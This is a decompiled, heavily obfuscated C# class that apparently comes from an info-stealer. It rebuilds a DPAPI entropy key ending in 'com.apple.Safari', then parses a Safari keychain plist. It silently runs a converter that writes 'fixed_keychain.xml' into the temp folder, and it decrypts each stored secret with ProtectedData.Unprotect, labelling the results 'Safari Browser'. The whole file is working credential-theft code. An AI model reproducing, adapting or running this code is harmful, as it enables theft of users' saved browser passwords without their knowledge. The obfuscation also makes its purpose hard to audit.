using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x0200002D RID: 45
internal sealed class gmp
{
	// Token: 0x0600014B RID: 331 RVA: 0x0002D1FC File Offset: 0x0002B3FC
	// Note: this type is marked as 'beforefieldinit'.
	static gmp()
	{
		byte[] array = new byte[144];
		for (;;)
		{
			IL_9EF:
			uint num = 1702788520u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 1034038134u)) % 60u)
				{
				case 0u:
					array[128] = 99;
					array[129] = 111;
					array[130] = 109;
					array[131] = 46;
					num = (num2 * 1071126506u ^ 3177429658u);
					continue;
				case 1u:
					array[17] = 103;
					array[18] = 129;
					array[19] = 3;
					num = (num2 * 2702260501u ^ 1910748130u);
					continue;
				case 2u:
					array[134] = 112;
					array[135] = 108;
					array[136] = 101;
					array[137] = 46;
					array[138] = 83;
					num = (num2 * 3159130106u ^ 2080420337u);
					continue;
				case 3u:
					array[100] = 139;
					array[101] = 169;
					num = (num2 * 2234430712u ^ 995126955u);
					continue;
				case 4u:
					array[132] = 97;
					array[133] = 112;
					num = (num2 * 3813102920u ^ 1014381268u);
					continue;
				case 6u:
					array[114] = 35;
					array[115] = 253;
					array[116] = 238;
					num = (num2 * 495423598u ^ 3918025073u);
					continue;
				case 7u:
					array[34] = 140;
					array[35] = 229;
					array[36] = 75;
					array[37] = 70;
					num = (num2 * 3575820238u ^ 4164632324u);
					continue;
				case 8u:
					array[126] = 239;
					num = (num2 * 3041919377u ^ 26000019u);
					continue;
				case 9u:
					array[127] = 145;
					num = (num2 * 3089499821u ^ 1543093883u);
					continue;
				case 10u:
					array[68] = 151;
					num = (num2 * 1460711752u ^ 865494483u);
					continue;
				case 11u:
					array[15] = 38;
					num = (num2 * 2894937734u ^ 3190445820u);
					continue;
				case 12u:
					array[11] = 10;
					array[12] = 98;
					num = (num2 * 3310114499u ^ 616722470u);
					continue;
				case 13u:
					array[69] = 216;
					array[70] = 175;
					array[71] = 128;
					array[72] = 56;
					array[73] = 96;
					num = (num2 * 114324195u ^ 3937570931u);
					continue;
				case 14u:
					array[55] = 253;
					array[56] = 9;
					num = (num2 * 4208605847u ^ 804344339u);
					continue;
				case 15u:
					array[39] = 193;
					num = (num2 * 1256651036u ^ 1605735010u);
					continue;
				case 16u:
					array[26] = 238;
					num = (num2 * 683889711u ^ 3652173375u);
					continue;
				case 17u:
					array[83] = 246;
					num = (num2 * 153862917u ^ 2827874904u);
					continue;
				case 18u:
					array[108] = 217;
					array[109] = 41;
					array[110] = 164;
					array[111] = 165;
					array[112] = 190;
					num = (num2 * 3037175813u ^ 2175338527u);
					continue;
				case 19u:
					array[117] = 241;
					array[118] = 76;
					array[119] = 15;
					array[120] = 116;
					array[121] = 94;
					array[122] = 88;
					array[123] = 251;
					num = (num2 * 2711100362u ^ 3547683636u);
					continue;
				case 20u:
					array[29] = 65;
					array[30] = 21;
					num = (num2 * 3364198402u ^ 4257031682u);
					continue;
				case 21u:
					array[49] = 0;
					array[50] = 220;
					num = (num2 * 273082524u ^ 3307830349u);
					continue;
				case 22u:
					array[45] = 117;
					num = (num2 * 944030916u ^ 2847838279u);
					continue;
				case 23u:
					array[84] = 29;
					array[85] = 142;
					num = (num2 * 3467397381u ^ 861036692u);
					continue;
				case 24u:
					array[95] = 6;
					array[96] = 110;
					num = (num2 * 2708453929u ^ 1093149650u);
					continue;
				case 25u:
					array[27] = 79;
					num = (num2 * 2022788684u ^ 4196981282u);
					continue;
				case 26u:
					array[91] = 116;
					array[92] = 64;
					array[93] = 75;
					array[94] = 181;
					num = (num2 * 2761461013u ^ 346599996u);
					continue;
				case 27u:
					array[139] = 97;
					array[140] = 102;
					num = (num2 * 3711879633u ^ 3440966366u);
					continue;
				case 28u:
					array[124] = 145;
					num = (num2 * 3352995212u ^ 3604335744u);
					continue;
				case 29u:
					array[32] = 123;
					array[33] = 20;
					num = (num2 * 251231150u ^ 4224179823u);
					continue;
				case 30u:
					array[74] = 11;
					array[75] = 113;
					array[76] = 14;
					array[77] = 104;
					array[78] = 83;
					array[79] = 119;
					array[80] = 47;
					num = (num2 * 2658178705u ^ 3026979363u);
					continue;
				case 31u:
					array[9] = 125;
					num = (num2 * 244607516u ^ 3791099033u);
					continue;
				case 32u:
					array[28] = 15;
					num = (num2 * 959986831u ^ 1631644890u);
					continue;
				case 33u:
					array[102] = 126;
					array[103] = 50;
					array[104] = 143;
					array[105] = 110;
					array[106] = 6;
					num = (num2 * 3175670295u ^ 2669059547u);
					continue;
				case 34u:
					array[107] = 36;
					num = (num2 * 1909437264u ^ 685253492u);
					continue;
				case 35u:
					array[141] = 97;
					num = (num2 * 4134329267u ^ 3294970857u);
					continue;
				case 36u:
					array[13] = 7;
					array[14] = 221;
					num = (num2 * 2961550815u ^ 2652504973u);
					continue;
				case 37u:
					array[52] = 48;
					array[53] = 160;
					array[54] = 158;
					num = (num2 * 2635809744u ^ 3271871136u);
					continue;
				case 38u:
					array[142] = 114;
					num = (num2 * 3160600224u ^ 2770983439u);
					continue;
				case 39u:
					array[51] = 15;
					num = (num2 * 1825482917u ^ 2160213124u);
					continue;
				case 40u:
					array[38] = 13;
					num = (num2 * 4096197413u ^ 3800303881u);
					continue;
				case 41u:
					array[48] = 73;
					num = (num2 * 1291925124u ^ 1883145103u);
					continue;
				case 42u:
					array[125] = 116;
					num = (num2 * 1056277471u ^ 3838396312u);
					continue;
				case 43u:
					array[113] = 38;
					num = (num2 * 689117181u ^ 3412172039u);
					continue;
				case 44u:
					array[31] = 237;
					num = (num2 * 1785054577u ^ 2476999583u);
					continue;
				case 45u:
					array[61] = 117;
					array[62] = 193;
					array[63] = 8;
					array[64] = 5;
					array[65] = 121;
					num = (num2 * 2507800079u ^ 1095515507u);
					continue;
				case 46u:
					array[0] = 29;
					array[1] = 172;
					array[2] = 168;
					array[3] = 248;
					array[4] = 211;
					array[5] = 184;
					array[6] = 72;
					array[7] = 62;
					array[8] = 72;
					num = (num2 * 2390869902u ^ 1288515129u);
					continue;
				case 47u:
					array[82] = 97;
					num = (num2 * 715407731u ^ 3037210686u);
					continue;
				case 48u:
					array[16] = 230;
					num = (num2 * 229810284u ^ 1604958675u);
					continue;
				case 49u:
					array[86] = 143;
					num = (num2 * 1325727414u ^ 676708146u);
					continue;
				case 50u:
					array[87] = 92;
					array[88] = 178;
					array[89] = 61;
					array[90] = 33;
					num = (num2 * 1308434125u ^ 3551526662u);
					continue;
				case 51u:
					array[81] = 15;
					num = (num2 * 325255346u ^ 4162286891u);
					continue;
				case 52u:
					array[40] = 142;
					array[41] = 254;
					array[42] = 214;
					array[43] = 231;
					array[44] = 39;
					num = (num2 * 2609563355u ^ 3119105208u);
					continue;
				case 53u:
					array[46] = 6;
					array[47] = 139;
					num = (num2 * 581662218u ^ 3104040053u);
					continue;
				case 54u:
					array[66] = 1;
					array[67] = 226;
					num = (num2 * 2368736921u ^ 1350358546u);
					continue;
				case 55u:
					array[57] = 133;
					array[58] = 241;
					array[59] = 200;
					array[60] = 170;
					num = (num2 * 83209069u ^ 616930032u);
					continue;
				case 56u:
					array[97] = 171;
					array[98] = 122;
					array[99] = 189;
					num = (num2 * 2974351268u ^ 2722704169u);
					continue;
				case 57u:
					array[20] = 231;
					array[21] = 178;
					array[22] = 19;
					array[23] = 165;
					array[24] = 176;
					array[25] = 121;
					num = (num2 * 1812047977u ^ 1491742403u);
					continue;
				case 58u:
					goto IL_9EF;
				case 59u:
					array[10] = 62;
					num = (num2 * 3244041932u ^ 1879730998u);
					continue;
				}
				goto Block_1;
			}
		}
		Block_1:
		array[143] = 105;
		gmp.gpt = array;
	}

	// Token: 0x0600014D RID: 333 RVA: 0x0002DC14 File Offset: 0x0002BE14
	internal static List<clo> gmr(string gms)
	{
		string input = File.ReadAllText(gms);
		List<clo> list = new List<clo>();
		clo clo = new clo();
		string input2 = Regex.Split(input, <Module>.smethod_strings_decryptor(291176 -> "<array>")))[1];
		string[] gpr = Regex.Split(input2, <Module>.smethod_strings_decryptor(291248 -> "<dict>")));
		string[] array;
		object obj = array;
		for (;;)
		{
			IL_1A1:
			uint num = 281743458u;
			for (;;)
			{
				uint num2;
				int num6;
				switch ((num2 = (num ^ 1495694773u)) % 7u)
				{
				case 1u:
				{
					object instance = gmp.goq(ref obj, gpr);
					array = (string[])obj;
					int num3 = Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(instance, null, <Module>.smethod_strings_decryptor(291224 -> "Length")), new object[0], null, null, null), 1));
					int num4 = 1;
					int num5 = num3;
					num6 = num4;
					num = (num2 * 242759388u ^ 2324484721u);
					continue;
				}
				case 2u:
					clo.cly = gmp.gos(array[num6], <Module>.smethod_strings_decryptor(291344 -> "<string>")), <Module>.smethod_strings_decryptor(290936 -> "</string>")), 5);
					clo.clv = gmp.gns(Convert.FromBase64String(gmp.gos(array[num6], <Module>.smethod_strings_decryptor(291008 -> "<data>")), <Module>.smethod_strings_decryptor(290984 -> "</data>")), 0)));
					clo.clx = <Module>.smethod_strings_decryptor(291056 -> "Safari Browser"));
					list.Add(clo);
					num = (num2 * 2874330076u ^ 1346717883u);
					continue;
				case 3u:
					goto IL_53;
				case 4u:
					checked
					{
						num6++;
					}
					num = (num2 * 4245546190u ^ 3738527961u);
					continue;
				case 5u:
				{
					int num5;
					if (num6 > num5)
					{
						num = 1156837857u;
						continue;
					}
					goto IL_53;
				}
				case 6u:
					goto IL_1A1;
				}
				return list;
				IL_53:
				clo.clu = gmp.gos(array[num6], <Module>.smethod_strings_decryptor(291296 -> "<string>")), <Module>.smethod_strings_decryptor(291400 -> "</string>")), 0);
				num = 128014886u;
			}
		}
		return list;
	}

	// Token: 0x0600014E RID: 334 RVA: 0x0002DDCC File Offset: 0x0002BFCC
	private static string gns(byte[] gnt)
	{
		byte[] array = ProtectedData.Unprotect(gnt, gmp.gpt, DataProtectionScope.CurrentUser);
		return Encoding.UTF8.GetString(array, 4, checked(array.Length - 4));
	}

	// Token: 0x0600014F RID: 335 RVA: 0x0002DDF8 File Offset: 0x0002BFF8
	internal static bool gny(string gnx, string gnw, ref string gnq)
	{
		gnq = null;
		Process process;
		for (;;)
		{
			IL_102:
			uint num = 1802423678u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 201063528u)) % 7u)
				{
				case 1u:
				{
					process.StartInfo.FileName = gnx;
					ProcessStartInfo startInfo = process.StartInfo;
					object left = Convert.ToString(<Module>.smethod_strings_decryptor(291032 -> "-convert xml1 -s -o "")));
					object value = gnq;
					object right = gmp.goq(ref value, Path.GetTempPath() + <Module>.smethod_strings_decryptor(291104 -> "\fixed_keychain.xml"")));
					gnq = Conversions.ToString(value);
					startInfo.Arguments = Convert.ToString(Operators.AddObject(Operators.ConcatenateObject(left, right), "\"")) + gnw + "\"";
					num = (num2 * 1051841203u ^ 98703037u);
					continue;
				}
				case 2u:
					process.StartInfo.CreateNoWindow = true;
					num = (num2 * 386250923u ^ 2236613437u);
					continue;
				case 3u:
					if (!File.Exists(gnx))
					{
						num = (num2 * 69098847u ^ 951969079u);
						continue;
					}
					goto IL_08;
				case 4u:
					goto IL_08;
				case 5u:
					goto IL_102;
				case 6u:
					return false;
				}
				goto Block_2;
				IL_08:
				process = new Process();
				num = 1140923511u;
			}
		}
		Block_2:
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.UseShellExecute = false;
		process.Start();
		process.WaitForExit();
		return process.StandardOutput.ReadToEnd().Length == 0;
	}

	// Token: 0x06000150 RID: 336 RVA: 0x0002DF48 File Offset: 0x0002C148
	private static string gos(string got, string gou, string gov, int goy)
	{
		string input = Regex.Split(got, gou)[checked(goy + 1)];
		return Regex.Split(input, gov)[0];
	}

	// Token: 0x06000151 RID: 337 RVA: 0x0002DF6C File Offset: 0x0002C16C
	private static object goq(ref object goz, object gpr)
	{
		goz = RuntimeHelpers.GetObjectValue(gpr);
		return gpr;
	}

	// Token: 0x0400039F RID: 927
	private static byte[] gpt;
}
